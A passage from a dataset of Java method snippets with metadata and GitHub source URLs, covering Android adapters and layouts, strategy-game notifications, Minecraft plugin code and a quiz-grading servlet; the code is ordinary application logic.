"https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55532, "method_name": "setOnItemLongClickListener", "class_name": "BaseAdapter", "params": ["OnItemLongClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnItemLongClickListener(OnItemLongClickListener listener) {\n        checkRecyclerViewState();\n        mItemLongClickListener = listener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55533, "method_name": "setOnChildLongClickListener", "class_name": "BaseAdapter", "params": ["int", "OnChildLongClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnChildLongClickListener(@IdRes int id, OnChildLongClickListener listener) {\n        checkRecyclerViewState();\n        if (mChildLongClickListeners == null) {\n            mChildLongClickListeners = new SparseArray<>();\n        }\n        mChildLongClickListeners.put(id, listener);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55534, "method_name": "checkRecyclerViewState", "class_name": "BaseAdapter", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void checkRecyclerViewState() {\n        if (mRecyclerView != null) {\n            // \u5fc5\u987b\u5728 RecyclerView.setAdapter() \u4e4b\u524d\u8bbe\u7f6e\u76d1\u542c\n            throw new IllegalStateException(\"are you ok?\");\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55535, "method_name": "setOnScrollingListener", "class_name": "BaseAdapter", "params": ["OnScrollingListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnScrollingListener(OnScrollingListener listener) {\n        mScrollingListener = listener;\n\n        //\u5982\u679c\u5f53\u524d\u5df2\u7ecf\u6709\u8bbe\u7f6e\u6eda\u52a8\u76d1\u542c\uff0c\u518d\u6b21\u8bbe\u7f6e\u9700\u8981\u79fb\u9664\u539f\u6709\u7684\u76d1\u542c\u5668\n        if (mScrollListener == null) {\n            mScrollListener = new ScrollListener();\n        } else {\n            mRecyclerView.removeOnScrollListener(mScrollListener);\n        }\n        //\u7528\u6237\u8bbe\u7f6e\u4e86\u6eda\u52a8\u76d1\u542c\uff0c\u9700\u8981\u7ed9RecyclerView\u8bbe\u7f6e\u76d1\u542c\n        if (mRecyclerView != null) {\n            //\u6dfb\u52a0\u6eda\u52a8\u76d1\u542c\n            mRecyclerView.addOnScrollListener(mScrollListener);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["ContextAction"], "modifiers": ["public", "abstract"]}}, {"id": 55536, "method_name": "onBindView", "class_name": "ViewHolder", "params": ["int"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "        public abstract void onBindView(int position);\n\n        /**\n         * \u8bb0\u5f55 ViewHolder \u4f4d\u7f6e\n         */\n        final void markViewHolderPosition(int position) {\n            mViewHolderPosition = position;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["View", "View"], "modifiers": ["public", "abstract"]}}, {"id": 55537, "method_name": "markViewHolderPosition", "class_name": "ViewHolder", "params": ["int"], "throws": null, "modifiers": ["final"], "return_type": "void", "snippet": "        final void markViewHolderPosition(int position) {\n            mViewHolderPosition = position;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["View", "View"], "modifiers": ["public", "abstract"]}}, {"id": 55538, "method_name": "getViewHolderPosition", "class_name": "ViewHolder", "params": [], "throws": null, "modifiers": ["final", "protected"], "return_type": "int", "snippet": "        protected final int getViewHolderPosition() {\n            return mViewHolderPosition;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["View", "View"], "modifiers": ["public", "abstract"]}}, {"id": 55539, "method_name": "onClick", "class_name": "ViewHolder", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(View v) {\n            if (v == getItemView()) {\n                if(mItemClickListener != null) {\n                    mItemClickListener.onItemClick(mRecyclerView, v, getViewHolderPosition());\n                    return;\n                }\n            }\n            if (mChildClickListeners != null) {\n                OnChildClickListener listener = mChildClickListeners.get(v.getId());\n                if (listener != null) {\n                    listener.onChildClick(mRecyclerView, v, getViewHolderPosition());\n                }\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["View", "View"], "modifiers": ["public", "abstract"]}}, {"id": 55540, "method_name": "onLongClick", "class_name": "ViewHolder", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean onLongClick(View v) {\n            if (v == getItemView()) {\n                if (mItemLongClickListener != null) {\n                    return mItemLongClickListener.onItemLongClick(mRecyclerView, v, getViewHolderPosition());\n                }\n            }\n            if (mChildLongClickListeners != null) {\n                OnChildLongClickListener listener = mChildLongClickListeners.get(v.getId());\n                if (listener != null) {\n                    listener.onChildLongClick(mRecyclerView, v, getViewHolderPosition());\n                }\n            }\n            return false;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["View", "View"], "modifiers": ["public", "abstract"]}}, {"id": 55541, "method_name": "getItemView", "class_name": "ViewHolder", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "View", "snippet": "        public final View getItemView() {\n            return itemView;\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["View", "View"], "modifiers": ["public", "abstract"]}}, {"id": 55542, "method_name": "findViewById", "class_name": "ViewHolder", "params": ["int"], "throws": null, "modifiers": ["final", "public"], "return_type": "V", "snippet": "        public final <V extends View> V findViewById(@IdRes int id) {\n            return getItemView().findViewById(id);\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": ["View", "View"], "modifiers": ["public", "abstract"]}}, {"id": 55543, "method_name": "onScrollStateChanged", "class_name": "ScrollListener", "params": ["RecyclerView", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onScrollStateChanged(@NonNull RecyclerView recyclerView, int newState) {\n\n            if (mScrollingListener == null) {\n                return;\n            }\n\n            if (newState == RecyclerView.SCROLL_STATE_IDLE) {\n\n                if (!recyclerView.canScrollVertically(1)) {\n                    //\u662f\u5426\u80fd\u5411\u4e0b\u6eda\u52a8\uff0cfalse \u8868\u793a\u5df2\u7ecf\u6eda\u52a8\u5230\u5e95\u90e8\n                    mScrollingListener.onScrollDown(recyclerView);\n                } else if (!recyclerView.canScrollVertically(-1)) {\n                    //\u662f\u5426\u80fd\u5411\u4e0a\u6eda\u52a8\uff0cfalse \u8868\u793a\u5df2\u7ecf\u6eda\u52a8\u5230\u9876\u90e8\n                    mScrollingListener.onScrollTop(recyclerView);\n                }\n\n            } else if (newState == RecyclerView.SCROLL_STATE_DRAGGING) {\n                //\u6b63\u5728\u6eda\u52a8\u4e2d\n                mScrollingListener.onScrolling(recyclerView);\n            }\n        }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/base/src/main/java/com/hjq/base/BaseAdapter.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["private"]}}, {"id": 55544, "method_name": "notifyAllianceFormed", "class_name": "GNNNotification", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyAllianceFormed(String message) {\n        GameSession.instance().addTurnNotification(new GNNNotification(message, \"GNN_Alliance_Formed\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55545, "method_name": "notifyAllianceBroken", "class_name": "GNNNotification", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyAllianceBroken(String message) {\n        GameSession.instance().addTurnNotification(new GNNNotification(message, \"GNN_Alliance_Broken\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55546, "method_name": "notifyCouncil", "class_name": "GNNNotification", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyCouncil(String message) {\n        GameSession.instance().addTurnNotification(new GNNNotification(message, \"GNN_Expansion\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55547, "method_name": "notifyExpansion", "class_name": "GNNNotification", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyExpansion(String message) {\n        GameSession.instance().addTurnNotification(new GNNNotification(message, \"GNN_Expansion\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55548, "method_name": "notifyRebellion", "class_name": "GNNNotification", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyRebellion(String message) {\n        GameSession.instance().addTurnNotification(new GNNNotification(message, \"GNN_Rebellion\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55549, "method_name": "notifyGenocide", "class_name": "GNNNotification", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyGenocide(String message) {\n        GameSession.instance().addTurnNotification(new GNNNotification(message, \"GNN_Genocide\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55550, "method_name": "notifyRandomEvent", "class_name": "GNNNotification", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyRandomEvent(String message, String id) {\n        GameSession.instance().addTurnNotification(new GNNRandomEventNotification(message, id));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55551, "method_name": "notifyRanking", "class_name": "GNNNotification", "params": ["String", "List<Empire>"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void notifyRanking(String message, List<Empire> empireList) {\n        GameSession.instance().addTurnNotification(new GNNRankingNotification(message, empireList, \"GNN_Ranking\"));\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55552, "method_name": "displayOrder", "class_name": "GNNNotification", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String displayOrder() { return GNN_NOTIFY; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55553, "method_name": "notifyPlayer", "class_name": "GNNNotification", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void notifyPlayer() {\n        RotPUI.instance().selectGNNPanel(message, eventId, null);\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/notifications/GNNNotification.java", "stars": "74", "class_props": {"extends": null, "implements": ["TurnNotification"], "modifiers": ["public"]}}, {"id": 55554, "method_name": "getContentSize", "class_name": "TextFlowLayout", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentSize() {\n        return mTextList.size();\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55555, "method_name": "getItemHorizontalSpace", "class_name": "TextFlowLayout", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getItemHorizontalSpace() {\n        return mItemHorizontalSpace;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55556, "method_name": "setItemHorizontalSpace", "class_name": "TextFlowLayout", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemHorizontalSpace(float itemHorizontalSpace) {\n        mItemHorizontalSpace = itemHorizontalSpace;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55557, "method_name": "getItemVerticalSpace", "class_name": "TextFlowLayout", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getItemVerticalSpace() {\n        return mItemVerticalSpace;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55558, "method_name": "setItemVerticalSpace", "class_name": "TextFlowLayout", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItemVerticalSpace(float itemVerticalSpace) {\n        mItemVerticalSpace = itemVerticalSpace;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55559, "method_name": "setTextList", "class_name": "TextFlowLayout", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTextList(List<String> textList) {\n        removeAllViews();\n        this.mTextList.clear();\n        this.mTextList.addAll(textList);\n        Collections.reverse(mTextList);\n        //\u904d\u5386\u5185\u5bb9\n        for(String text : mTextList) {\n            //\u6dfb\u52a0\u5b50view\n            //LayoutInflater.from(getContext()).inflate(R.layout.flow_text_view,this,true);\n            // \u7b49\u4ef7\u4e8e\n            TextView item = (TextView) LayoutInflater.from(getContext()).inflate(R.layout.flow_text_view,this,false);\n            item.setText(text);\n            item.setOnClickListener(new OnClickListener() {\n                @Override\n                public void onClick(View v) {\n                    if(mItemClickListener != null) {\n                        mItemClickListener.onFlowItemClick(text);\n                    }\n                }\n            });\n            addView(item);\n        }\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55560, "method_name": "onMeasure", "class_name": "TextFlowLayout", "params": ["int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onMeasure(int widthMeasureSpec,int heightMeasureSpec) {\n        super.onMeasure(widthMeasureSpec,heightMeasureSpec);\n        if(getChildCount() == 0) {\n            return;\n        }\n        //\u8fd9\u4e2a\u662f\u63cf\u8ff0\u5355\u884c\n        List<View> line = null;\n        lines.clear();\n        mSelfWidth = MeasureSpec.getSize(widthMeasureSpec) - getPaddingLeft() - getPaddingRight();\n        LogUtils.d(this,\"mSelfWidth == > \" + mSelfWidth);\n        //\u6d4b\u91cf\n        LogUtils.d(this,\"onMeasure -- > \" + getChildCount());\n        //\u6d4b\u91cf\u5b69\u5b50\n        int childCount = getChildCount();\n        for(int i = 0; i < childCount; i++) {\n            View itemView = getChildAt(i);\n            if(itemView.getVisibility() != VISIBLE) {\n                //\u4e0d\u9700\u8981\u8fdb\u884c\u6d4b\u91cf\n                continue;\n            }\n            //\u6d4b\u91cf\u524d\n            //LogUtils.d(this,\"before height -- > \" + itemView.getMeasuredHeight());\n            measureChild(itemView,widthMeasureSpec,heightMeasureSpec);\n            //\u6d4b\u91cf\u540e\n            // LogUtils.d(this,\"after height -- > \" + itemView.getMeasuredHeight());\n            if(line == null) {\n                //\u8bf4\u660e\u5f53\u524d\u884c\u4e3a\u7a7a\uff0c\u53ef\u4ee5\u6dfb\u52a0\u8fdb\u6765\n                line = createNewLine(itemView);\n            } else {\n                //\u5224\u65ad\u662f\u5426\u53ef\u4ee5\u518d\u7ee7\u7eed\u6dfb\u52a0\n                if(canBeAdd(itemView,line)) {\n                    //\u53ef\u4ee5\u6dfb\u52a0\uff0c\u6dfb\u52a0\u53bb\n                    line.add(itemView);\n                } else {\n                    //\u65b0\u521b\u5efa\u4e00\u884c\n                    line = createNewLine(itemView);\n                }\n            }\n        }\n        mItemHeight = getChildAt(0).getMeasuredHeight();\n        int selfHeight = (int) (lines.size() * mItemHeight + mItemVerticalSpace * (lines.size() + 1) + 0.5f);\n        //\u6d4b\u91cf\u81ea\u5df1\n        setMeasuredDimension(mSelfWidth,selfHeight);\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55561, "method_name": "createNewLine", "class_name": "TextFlowLayout", "params": ["View"], "throws": null, "modifiers": ["private"], "return_type": "List<View>", "snippet": "    private List<View> createNewLine(View itemView) {\n        List<View> line = new ArrayList<>();\n        line.add(itemView);\n        lines.add(line);\n        return line;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55562, "method_name": "canBeAdd", "class_name": "TextFlowLayout", "params": ["View", "List<View>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean canBeAdd(View itemView,List<View> line) {\n        //\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u5b50view\u5bbd\u5ea6\u76f8\u52a0+(line.size()+1)*mItemHorizontalSpace + itemView.getMeasuredWidth()\n        //\u6761\u4ef6\uff1a\u5982\u679c\u5c0f\u4e8e/\u7b49\u4e8e\u5f53\u524d\u63a7\u4ef6\u7684\u5bbd\u5ea6\uff0c\u5219\u53ef\u4ee5\u6dfb\u52a0\uff0c\u5426\u5219\u4e0d\u80fd\u6dfb\u52a0\n        int totalWith = itemView.getMeasuredWidth();\n        for(View view : line) {\n            //\u53e0\u52a0\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u63a7\u4ef6\u7684\u5bbd\u5ea6\n            totalWith += view.getMeasuredWidth();\n        }\n        //\u6c34\u5e73\u95f4\u8ddd\u7684\u5bbd\u5ea6\n        totalWith += mItemHorizontalSpace * (line.size() + 1);\n        //LogUtils.d(this,\"totalWith -- > \" + totalWith);\n        //LogUtils.d(this,\"mSelfWidth -- > \" + mSelfWidth);\n        //\u5982\u679c\u5c0f\u4e8e/\u7b49\u4e8e\u5f53\u524d\u63a7\u4ef6\u7684\u5bbd\u5ea6\uff0c\u5219\u53ef\u4ee5\u6dfb\u52a0\uff0c\u5426\u5219\u4e0d\u80fd\u6dfb\u52a0\n        return totalWith <= mSelfWidth;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55563, "method_name": "onLayout", "class_name": "TextFlowLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onLayout(boolean changed,int l,int t,int r,int b) {\n        //\u6446\u653e\u5b69\u5b50\n        LogUtils.d(this,\"onLayout -- > \" + getChildCount());\n        int topOffset = (int) mItemHorizontalSpace;\n        for(List<View> views : lines) {\n            //views\u662f\u6bcf\u4e00\u884c\n            int leftOffset = (int) mItemHorizontalSpace;\n            for(View view : views) {\n                //\u6bcf\u4e00\u884c\u91cc\u7684\u6bcf\u4e2aitem\n                view.layout(leftOffset,topOffset,leftOffset + view.getMeasuredWidth(),topOffset + view.getMeasuredHeight());\n                //\n                leftOffset += view.getMeasuredWidth() + mItemHorizontalSpace;\n            }\n            topOffset += mItemHeight + mItemHorizontalSpace;\n        }\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55564, "method_name": "setOnFlowTextItemClickListener", "class_name": "TextFlowLayout", "params": ["OnFlowTextItemClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnFlowTextItemClickListener(OnFlowTextItemClickListener listener) {\n        this.mItemClickListener = listener;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/ui/custom/TextFlowLayout.java", "stars": "9", "class_props": {"extends": "ViewGroup", "implements": null, "modifiers": ["public"]}}, {"id": 55565, "method_name": "getEvent", "class_name": "ViewModelUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LiveData<Integer>", "snippet": "    public LiveData<Integer> getEvent()\n    {\n\n        return event;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewModels/ViewModelUser.java", "stars": "10", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 55566, "method_name": "getMessage", "class_name": "ViewModelUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "LiveData<String>", "snippet": "    public LiveData<String> getMessage()\n    {\n\n        return message;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewModels/ViewModelUser.java", "stars": "10", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 55567, "method_name": "getUserProfile", "class_name": "ViewModelUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getUserProfile()\n    {\n\n\n\n        User endUser = PrefLogin.getUser(getApplication());\n\n        if(endUser==null)\n        {\n            return;\n        }\n\n\n\n\n\n        Call<User> call = userService.getProfile(\n                PrefLogin.getAuthorizationHeaders(getApplication())\n        );\n\n\n\n\n\n        call.enqueue(new Callback<User>() {\n            @Override\n            public void onResponse(Call<User> call, Response<User> response) {\n\n\n\n                if(response.code()==200)\n                {\n\n                    PrefLogin.saveUserProfile(response.body(),getApplication());\n\n\n//                    message.postValue(\"Successful !\");\n                    event.postValue(ViewModelUser.EVENT_profile_fetched);\n\n                }\n                else\n                {\n                    message.postValue(\"Failed code : \" + response.code());\n                }\n\n\n\n            }\n\n            @Override\n            public void onFailure(Call<User> call, Throwable t) {\n\n\n//                message.postValue(\"Failed ! Check your network connection !\");\n\n            }\n        });\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/ViewModels/ViewModelUser.java", "stars": "10", "class_props": {"extends": "AndroidViewModel", "implements": null, "modifiers": ["public"]}}, {"id": 55568, "method_name": "enable", "class_name": "VipPlayerLifecycle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void enable() {\n\n        type = plugin.getDatabaseLifecycle().getType();\n        vipPlayerCache = new VipPlayerCache();\n        loadRepository();\n\n    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/lifecycle/VipPlayerLifecycle.java", "stars": "2", "class_props": {"extends": "Lifecycle", "implements": null, "modifiers": ["public"]}}, {"id": 55569, "method_name": "loadRepository", "class_name": "VipPlayerLifecycle", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loadRepository() {\n\n        if (type == null) {\n            return;\n        }\n\n        if (type.equalsIgnoreCase(\"SQLite\")) {\n            vipPlayerRepository = new VipPlayerSQLiteRepository(plugin, plugin.getDatabaseLifecycle().getDatabaseConnection());\n            return;\n        }\n\n        if (type.equalsIgnoreCase(\"MySQL\")) {\n            vipPlayerRepository = new VipPlayerMySQLRepository(plugin, plugin.getDatabaseLifecycle().getDatabaseConnection());\n            return;\n        }\n\n        vipPlayerRepository = new VipPlayerSQLiteRepository(plugin, plugin.getDatabaseLifecycle().getDatabaseConnection());\n\n    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/lifecycle/VipPlayerLifecycle.java", "stars": "2", "class_props": {"extends": "Lifecycle", "implements": null, "modifiers": ["public"]}}, {"id": 55570, "method_name": "onCommand", "class_name": "GetPrefixCommand", "params": ["CommandSender", "Command", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {\n        // This command is only for players.\n        if (!(sender instanceof Player)) {\n            sender.sendMessage(ChatColor.RED + \"This command is only for players!\");\n            return true;\n        }\n\n        Player player = (Player) sender;\n\n        // Get a LuckPerms cached metadata for the player.\n        CachedMetaData metaData = this.luckPerms.getPlayerAdapter(Player.class).getMetaData(player);\n\n        // Get their prefix.\n        String prefix = metaData.getPrefix();\n\n        // Tell the sender.\n        sender.sendMessage(ChatColor.RED + \"Your prefix is: \" + ChatColor.RESET + prefix);\n        return true;\n    }", "url": "https://raw.githubusercontent.com/LuckPerms/api-cookbook/master/src/main/java/me/lucko/lpcookbook/commands/GetPrefixCommand.java", "stars": "1", "class_props": {"extends": null, "implements": ["CommandExecutor"], "modifiers": ["public"]}}, {"id": 55571, "method_name": "service", "class_name": "ResultServlet", "params": ["HttpServletRequest", "HttpServletResponse"], "throws": ["ServletException", "IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void service(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException\n\t{\n\t\tPrintWriter out=response.getWriter();\n\t\tString Q6=request.getParameter(\"Q6\");\n\t\tString Q7=request.getParameter(\"Q7\");\n\t\tString Q8=request.getParameter(\"Q8\");\n\t\tString Q9=request.getParameter(\"Q9\");\n\t\tString Q10=request.getParameter(\"Q10\");\n\n\t\tArrayList<String> r = new ArrayList<String>(4); \n        r.add(\"option1\"); \n        r.add(\"option2\"); \n        r.add(\"option3\"); \n        r.add(\"option4\");\n\t\t\n\t\tint co=0,at=0;\n\t\tif(r.contains(Q6))\n\t\t\tat++;\n\t\tif(r.contains(Q7))\n\t\t\tat++;\n\t\tif(r.contains(Q8))\n\t\t\tat++;\n\t\tif(r.contains(Q9))\n\t\t\tat++;\n\t\tif(r.contains(Q10))\n\t\t\tat++;\n\n\t\tCookie[] c=request.getCookies();\n\n\t\tMap<String,String> hm=new HashMap<String,String>(); \n\n\t\thm.put(\"Q1\",\"option2\");\n\t\thm.put(\"Q2\",\"option1\");\n\t\thm.put(\"Q3\",\"option2\");\n\t\thm.put(\"Q4\",\"option4\");\n\t\thm.put(\"Q5\",\"option3\");\n\n\t\tfor(int 